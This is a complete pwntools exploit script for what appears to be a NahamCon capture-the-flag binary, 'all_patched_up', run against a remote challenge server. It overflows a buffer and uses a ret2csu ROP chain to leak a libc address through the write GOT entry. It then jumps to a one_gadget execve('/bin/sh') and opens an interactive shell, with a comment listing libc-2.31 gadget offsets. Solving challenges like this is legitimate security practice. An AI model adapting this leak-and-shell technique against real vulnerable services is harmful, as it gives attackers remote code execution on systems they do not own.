from pwn import *

CONN = "nc challenge.nahamcon.com 31617".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
continue
""".format(
    **locals()
)

# Binary filename
exe = "./all_patched_up"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ld = ELF("/lib64/ld-linux-x86-64.so.2")

OFFSET_LD = 0x3a2e0

if args.REMOTE:
    libc = ELF("./libc-2.31.so")

# Start program
io = start()
offset = 520

MOV_RDI_1_RET = 0x0000000000401254 
init = 0x0000000000401000
popper = 0x000000000040124a
caller = 0x0000000000401230

# Build the payload
payload = flat({offset: [
  p64(popper),
  p64(0x0), #RBX
  p64(0x1), #RBP
  p64(0x1), #R12 -> RDI
  p64(elf.got["write"]), #R13 -> RSI
  p64(0x20), #R14 -> RDX
  p64(elf.got["write"]), #R15 -> caller
  p64(caller),
  b"\x00" * 56,
  p64(elf.sym["main"])
]})

"""
 one_gadget libc-2.31.so
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

"""
io.sendafter(b"> ", payload)

sleep(0.1)
leak = u64(io.recv(8))
info("leak: " + hex(leak))

# ret2csu
libc.address = leak - libc.sym["write"]
onegadget = libc.address + 0xe3afe
payload = flat({
  offset: [
    p64(onegadget)
  ]
})

io.sendafter(b"> ", payload)
# info("LD address: " + hex(ld.address))

# # Got Shell?
io.interactive()